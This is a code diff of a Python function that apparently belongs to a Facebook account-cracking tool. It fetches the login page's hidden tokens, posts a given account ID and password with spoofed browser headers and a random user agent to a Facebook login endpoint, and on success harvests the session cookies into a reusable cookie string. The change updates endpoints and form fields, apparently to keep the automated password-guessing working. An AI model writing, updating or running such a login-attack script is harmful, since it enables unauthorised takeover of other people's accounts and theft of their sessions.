@@ -1362,30 +1362,52 @@ def m4(idf,pwv):
    session = requests.Session()
    ua = random.choice(usragent)
    free_fb = session.get('https://lm.facebook.com/').text
-   log_data ={
-    'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+   log_data ={'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
     'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+    'api_key': '124024574287414',
+    'cancel_url': 'https://www.instagram.com/accounts/signup/?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=%7B%22fbLoginKey%22%3A%22c6kka2h47zoya97pkk8yrh6y55de8e1jbsrdvpsni3rfeq3w%22%2C%22fbLoginReturnURL%22%3A%22%2Ffxcal%2Fdisclosure%2F%3Fnext%3D%252F%22%7D#_=_',
+    'display': 'page',
+    'isprivate': '',
+    'return_session': '',
+    'skip_api_login': '1',
+    'signed_next': '1',
+    'trynum': '2',
+    'timezone': '-330',
+    'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
+    'lgnrnd': '053010_5Kee',
+    'lgnjs': '1720269011',
     'email': idf,
-    'login_source': 'comet_headerless_login',
-    'next': '',
-    'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1), ps) }
-   header_freefb = {
-    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-    'Accept-Language': 'en-US,en;q=0.9',
-    'Accept-Encoding': 'gzip, deflate, br',
-    'Connection': 'keep-alive',
-    'Upgrade-Insecure-Requests': '1',
-    'Sec-Fetch-Site': 'same-origin',
-    'Sec-Fetch-Mode': 'navigate',
-    'Sec-Fetch-User': '?1',
-    'Sec-Fetch-Dest': 'document',
-    'Cache-Control': 'max-age=0',
-    'Referer': 'https://mbasic.beta.facebook.com/',
-    'DNT': '1',
-    'Pragma': 'no-cache',
-    'TE': 'Trailers', }#'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',}
-   lo = session.post('https://mbasic.alpha.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
+    'prefill_contact_point': idf,
+    'prefill_source': 'browser_dropdown',
+    'prefill_type': 'password',
+    'first_prefill_source': 'browser_dropdown',
+    'first_prefill_type': 'contact_point',
+    'had_cp_prefilled': 'true',
+    'had_password_prefilled': 'true',
+    'ab_test_data': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAY',
+    'encpass': '#PWD_BROWSER:5:{}:{}'.format(re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1), ps),}
+   header_freefb ={
+    "authority": f'p.facebook.com',
+    "method": 'POST',
+    "scheme": 'https',
+    "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    "accept-encoding": 'gzip, deflate, br',
+    "accept-language": 'en-US,en;q=0.9',
+    "cache-control": 'no-cache, no-store, must-revalidate',
+    "referer": f'https://p.facebook.com/',
+    "sec-ch-ua": '"Google Chrome";v="90", "Chromium";v="90"',
+    "sec-ch-ua-mobile": '?0',
+    "sec-ch-ua-platform": "Windows",
+    "sec-fetch-dest": 'document',
+    "sec-fetch-mode": 'navigate',
+    "sec-fetch-site": 'same-origin',
+    "sec-fetch-user": '?1',
+    "pragma": 'no-cache',
+    "priority": 'u=1',
+    "cross-origin-resource-policy": 'cross-origin',
+    "upgrade-insecure-requests": '1',
+    "user-agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',}#'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',}
+   lo = session.post('https://p.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_US%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522c6kka2h47zoya97pkk8yrh6y55de8e1jbsrdvpsni3rfeq3w%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D46872004-42b5-4ae5-bf75-9080e2067cae%26tp%3Dunspecified%26cbt%3D1720269002212&lwv=120&lwc=1348028',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
